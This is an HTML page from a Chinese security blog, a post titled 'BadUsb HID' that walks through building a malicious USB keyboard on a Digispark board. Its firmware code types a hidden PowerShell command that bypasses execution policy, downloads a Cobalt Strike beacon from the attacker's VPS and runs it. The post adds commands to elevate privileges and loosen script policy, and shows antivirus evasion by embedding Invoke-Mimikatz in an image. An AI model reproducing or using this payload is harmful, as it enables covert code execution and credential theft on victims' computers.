@@ -1,0 +1,477 @@
+<!-- 博文的布局-Layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- 引入head标签 -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Cyber Security" />
+<meta name="keywords" content="blockchain security,web security,system security..." />
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="//at.alicdn.com/t/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+<!-- Favicon -->
+<link href="/assets/profile.jpeg" rel="shortcut icon" />
+<link href="/assets/profile.jpeg" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>BadUsb HID</title>
+<!-- 百度统计 -->
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- 谷歌分析 -->
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(128,128,128) ">
+</head>
+<body>
+
+<!-- 顶部锚点 -->
+<a id="htmlup" name="htmlup"></a>
+<!-- 引入博文顶部选项 -->
+
+<header id="post-header" style="background-color:rgb(128,128,128);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">Wake up neo</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">首页</a></li>
+              
+                <li><a href="/tags.html" style="color: white;">标签</a></li>
+              
+                <li><a href="/timeline.html" style="color: white;">时间线</a></li>
+              
+                <li><a href="/about.html" style="color: white;">关于博主</a></li>
+              
+                <li><a href="/friendLink.html" style="color: white;">友情链接</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- 引入移动下拉选项 -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>首页</li></a>
+        
+          <a href="/tags.html"><li>标签</li></a>
+        
+          <a href="/timeline.html"><li>时间线</li></a>
+        
+          <a href="/about.html"><li>关于博主</li></a>
+        
+          <a href="/friendLink.html"><li>友情链接</li></a>
+        
+    </ul>
+</div>
+
+<!-- 引入博文顶部样式 -->
+<!-- 版本一 垃圾 -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">BadUsb HID</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!-- 版本二 可切换页面 -->
+
+<div class="post-top" style="background-color:rgb(128,128,128);">
+  <!-- 页面宽度大于800px -->
+  <div class="left-area">
+    
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(128,128,128)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(128,128,128);"><sapn class="main">没有上一页咯</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">BadUsb HID</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">作者&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/2022/11/07/MooCakeCTX-attack.html" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(128,128,128)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(128,128,128);"><sapn class="main">MooCakeCTX attack</sapn></span></div>
+    
+  </div>
+
+  <!-- 页面宽度小于800px -->
+  <div class="post-changearea">
+    
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(128,128,128);border-bottom: 2px solid rgb(128,128,128);"><span><br>没有上一篇咯</span></a>
+    
+    
+      <a href="/2022/11/07/MooCakeCTX-attack.html" class="rightchange" style="border-left: 1px solid rgb(128,128,128);border-bottom: 2px solid rgb(128,128,128);"><span>下一篇<br><br>MooCakeCTX attack</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+
+  
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(128,128,128); border-right: 8px solid rgb(128,128,128)">
+        BadUsb HID exper by Anoxia!
+      </div>
+    
+  
+
+  <!-- 文章内容 -->
+  <p>author: by Anoxia<br />
+check: by yako33</p>
+
+<h4 id="hid原理">HID原理：</h4>
+<p>利用HID进行攻击，将USB设备伪装使电脑识别为键盘，利用模拟键盘或者针脚爆破的方式强行攻击，最为常见的方式badusb，或者可以使用其他typec设备对android等设备进行针脚暴力破解等，其中针对badusb有2种制作方向，一种是usb的驱动加载来实现，一种是模拟键盘操作加载来实现，两种方式的目的都是为了突破验证手段。</p>
+
+<h4 id="漏洞产生原因">漏洞产生原因：</h4>
+<p>USB设备通常在加载时所要求的权限并不高，行为也很难被识别，所以系统的安全防护软件通常对这类硬件设备的检测力度不够严格，即使在工业生产中所使用的防护设备通常以USB只读的方式运行，但仍然可以通过插入usb设备时的加载文件进行Bypass</p>
+
+<h4 id="前期准备">前期准备：</h4>
+<p>准备ATTINY85 Digispark(Attiny85)微型USB开发板(本文中作者使用的设备)，如图：</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/1.png" alt="1" /></p>
+  </li>
+</ul>
+
+<p>使用该设备需要安装驱动，博主更加推荐的设备为Arduino Leonardo (Atmega32u4)，但价格会更高一些。</p>
+
+<p>同时可以选择的开发板为
+Arduino Micro (Atmega32u4)
+Chineese Arduino Leonardo clones (Atmega32u4)
+Teensy 2.0 (Atmega32u4)
+Phoenix Ovipositor (Atmega32u4)</p>
+
+<h4 id="arduino-ide环境配置">arduino ide环境配置：</h4>
+<p>打开文件-&gt;首选项，在附加开发板管理器中添加地址：<a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/3.png" alt="3" /></p>
+  </li>
+</ul>
+
+<p>然后选择开发板管理器，进去后会自动下载索引，如果未下载成功，开启科学上网重新下载</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/4.png" alt="4" /></p>
+  </li>
+</ul>
+
+<p>然后搜索 “Digistump AVR Boards by Digistump”  进行安装,再在开发板中选择 Digispark（Default-16.5mhz）</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/5.png" alt="5" /></p>
+  </li>
+</ul>
+
+<p>再选择开发板</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/6.png" alt="6" /></p>
+  </li>
+</ul>
+
+<h4 id="badusb制作">BadUsb制作：</h4>
+<p>利用cs生成一个ps1的木马文件，使用ps1文件的原因是因为目前windows系统中普遍支持Powershell，并且可以直接在命令行中运行，测试起来比较方便，实际攻击过程中可能还是会使用标准的木马文件。此处为了方便测试简单监听在vps上用python（python2 -m SimpleHTTPServer 8888）起一个http服务把这个木马文件放上去,具体使用的方式非常多样。</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/7.png" alt="7" /></p>
+  </li>
+</ul>
+
+<p><br />需要将以下代码烧录进开发板中,将ip换成刚才的vps服务器的</p>
+
+<pre><code class="language-arduino">#include "DigiKeyboard.h"		//定义使用虚拟键盘函数库
+#define KEY_ESC     41
+#define KEY_BACKSPACE 42
+#define KEY_TAB     43
+#define KEY_PRT_SCR 70
+#define KEY_DELETE  76
+
+//在初始化中运行，意思是在插入读取时运行
+void setup() {
+
+DigiKeyboard.sendKeyStroke(0);
+//延时，等待确保执行完成
+DigiKeyboard.delay(1000);	
+//上面这两个输入是windows键+r键盘
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);	
+//延时	
+DigiKeyboard.delay(1000);	
+//输入powershell的弹shell的代码（要绕杀毒需做免杀）
+DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString('http://ip:port/beacon.ps1');"));	
+DigiKeyboard.delay(500);
+//输入enter键盘
+DigiKeyboard.sendKeyStroke(KEY_ENTER);	
+DigiKeyboard.delay(750);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+}
+void loop() {
+  //主逻辑循环这里未使用所以没有编写，可以在此处完成后渗透维权相关操作。
+}
+</code></pre>
+<p>将代码复制到arduinoide进行烧录，点击上传后看到下面这样的代表编译成功。然后在60秒内插入BadUsb进行烧录</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/8.png" alt="8" /></p>
+  </li>
+</ul>
+
+<p>这样就代表烧录成功了，拔下来然后就可以使用了</p>
+
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/9.png" alt="9" /></p>
+  </li>
+</ul>
+
+<h4 id="实际过程中的注意点">实际过程中的注意点：</h4>
+<p>关于静默执行部分：</p>
+
+<p>在模拟键盘操作部分可以添加下面的命令，来更好的命中</p>
+<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//powershell中开启管理员权限，此处没有隐藏窗口，需要自行添加
+<span class="nb">start</span><span class="na">-process </span><span class="kd">PowerShell</span> <span class="na">-verb </span><span class="nb">runas</span>
+//以cmd中以管理员打开powershell
+<span class="kd">powershell</span> <span class="nb">start</span><span class="na">-process </span><span class="kd">powershell</span> <span class="na">-verb </span><span class="nb">runas</span>
+//部分windows由于，默认不开启ps1执行，在管理员权限下执行
+//可以先获取当前权限，如果编写判断，如果权限不足可以设置如RemoteSigned/Restricted
+<span class="kd">Get</span><span class="na">-ExecutionPolicy
+</span>//设置权限为无认证可以执行
+<span class="kd">set</span><span class="na">-executionpolicy -executionpolicy </span><span class="kd">unrestricted</span>
+//在选择中选择A，全是
+<span class="kd">A</span>
+//接下来继续执行后门链接操作。
+</code></pre></div></div>
+<ul>
+<li style="list-style-type: none;">
+    <p><img src="http://localhost:4000/screenshot/20221117badusb/10.png" alt="10" /></p>
+  </li>
+</ul>
+
+<p>关于ps1免杀部分：</p>
+
+<p>一种可以使用免杀混淆(推荐这种，目前主要使用)，一种是直接使用键盘命令，使用arduino重构指令(比较麻烦也算是种思路)。</p>
+
+<p>使用<a href="https://github.com/peewpw/Invoke-PSImage">Invoke-PSImage</a>免杀，官方的使用说明中已经说的非常清楚了，使用也很简单(位图免杀混淆此处不讨论。)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-PSImage.ps1</span><span class="w">
+</span><span class="n">//</span><span class="err">这里可以使用</span><span class="nt">-WebRequest</span><span class="err">生成</span><span class="nx">URL</span><span class="err">的请求。</span><span class="w">
+</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Invoke-PSImage</span><span class="w"> </span><span class="nt">-Script</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-Mimikatz.ps1</span><span class="w"> </span><span class="nt">-Out</span><span class="w"> </span><span class="o">.</span><span class="nx">\evil-kiwi.png</span><span class="w"> </span><span class="nt">-Image</span><span class="w"> </span><span class="o">.</span><span class="nx">\kiwi.jpg</span><span class="w">
+</span></code></pre></div></div>
+<p>值得注意的是，在Invoke-PSImage中可能会遇到生成文件过大失败的情况，而在cs生成的ps1中有很多代码都在if判断中不会被执行可以删除，删除之后可以解决这个问题。</p>
+
+<p>另一种为自己写代码实现自己想要输入的键盘命令,部分代码,如果使用键盘重构可以打乱编码顺序进行混淆，下面是参考网上的代码作为布局参考:</p>
+<pre><code class="language-arduino">#定义或头相关
+#ifndef __DigiKeyboard_h__
+...
+#include "scancode-ascii-table.h"
+#定义类型
+...
+#重构键盘
+PROGMEM char usbHidReportDescriptor[USB_CFG_HID_REPORT_DESCRIPTOR_LENGTH] = { /* USB report descriptor */
+  0x05, 0x01,                    // USAGE_PAGE (Generic Desktop) 
+  0x09, 0x06,                    // USAGE (Keyboard) 
+...
+  0x29, 0x65,                    //   USAGE_MAXIMUM (Keyboard Application) 
+  0x81, 0x00,                    //   INPUT (Data,Ary,Abs) 
+  0xc0                           // END_COLLECTION 
+};
+
+#define MOD_CONTROL_LEFT    (1&lt;&lt;0)
+...
+#define MOD_GUI_RIGHT       (1&lt;&lt;7)
+
+#define KEY_A       4
+...
+#define KEY_F12     69
+
+//自定义键盘类，并在初始化中完成操作
+class DigiKeyboardDevice : public Print {
+ public:
+  DigiKeyboardDevice () {
+    cli();
+    usbDeviceDisconnect();
+    _delay_ms(250);
+    usbDeviceConnect();
+    usbInit();     
+    sei();
+    memset(reportBuffer, 0, sizeof(reportBuffer));      
+    usbSetInterrupt(reportBuffer, sizeof(reportBuffer));
+  }
+    
+  void update() {
+    usbPoll();
+  }
+	
+...
+//实例化
+DigiKeyboardDevice DigiKeyboard = DigiKeyboardDevice();
+...
+</code></pre>
+
+  <!-- 引入share模块 -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        ,
+        
+      
+        'weibo'
+        ,
+        
+      
+        'twitter'
+        ,
+        
+      
+        'facebook'
+        
+      
+    ],
+    wechatQrcodeTitle: "分享到微信朋友圈",
+    wechatQrcodeHelper: '期待在朋友圈见到这篇文章'
+  });
+</script>
+
+</div>
+
+<!-- 底部锚点 -->
+<a id="htmldown" name="htmldown"></a>
+<!-- 引入评论模块 -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDI2OS8xMDgwNg=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    <!-- City版安装代码已完成 -->
+
+
+
+
+
+<!-- 引入goto模块 -->
+<div class="bounceInRight animated go">
+  <a title="顶部切换页面" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="底部有livere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- 引入页面底部模块 -->
+<footer id="bottom">
+  <br>
+  <span>Rookie Hacker ©
+  
+  
+    2018
+    -
+  
+  2022
+  <br>
+  Powered by <a href="https://www.jekyll.com.cn/">Jekyll</a> | <a href="https://github.com/xukimseven/HardCandy-Jekyll">HardCandy-Jekyll</a></span>
+</footer>
+
+
+<!-- 引用wow.js的动画效果 -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- 页面刷新回到顶部 -->
+<script>
+    window.onbeforeunload = function(){
+        //刷新后页面自动回到顶部
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+<script src="/assets/js/main.js"></script>
+</body>
+</html>
